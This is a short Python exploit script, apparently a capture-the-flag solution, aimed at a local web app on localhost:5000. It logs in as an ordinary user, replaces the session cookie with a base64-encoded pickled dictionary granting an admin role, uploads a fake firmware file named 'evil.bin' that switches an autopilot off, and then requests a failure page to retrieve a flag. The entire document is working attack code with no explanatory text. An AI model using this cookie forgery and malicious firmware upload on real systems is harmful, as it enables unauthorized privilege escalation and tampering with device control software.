import base64
import pickle
import urllib.request
import urllib.parse
import http.cookiejar

BASE = 'http://localhost:5000'

# helper opener with cookie support
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# 1. login as l.perez to get a session cookie
opener.open(f'{BASE}/login/l.perez')
print('[+] Logged in as l.perez')

# 2. craft malicious admin cookie
payload = base64.b64encode(pickle.dumps({'username': 'hacker', 'role': 'admin'})).decode()
# replace cookie in jar
for c in list(cj):
    if c.name == 'session':
        cj.clear(domain=c.domain, path=c.path, name=c.name)
        break
cj.set_cookie(http.cookiejar.Cookie(0, 'session', payload, None, False, 'localhost', False, False, '/', True, False, None, True, None, None, {}))
print('[+] Replaced session cookie with admin payload')

# 3. upload firmware turning autopilot off
boundary = '----hydro'
data = (
    f'--{boundary}\r\n'
    'Content-Disposition: form-data; name="file"; filename="evil.bin"\r\n'
    'Content-Type: application/octet-stream\r\n\r\n'
    'autopilot: off\nwarnings: on\n'
    f'\r\n--{boundary}--\r\n'
).encode()
req = urllib.request.Request(f'{BASE}/firmware/update', data=data)
req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
resp = opener.open(req)
print('[+] Firmware upload response:', resp.read().decode())

# 4. trigger failure to obtain flag
flag_page = opener.open(f'{BASE}/fail').read().decode()
print('[+] Flag page:\n', flag_page)

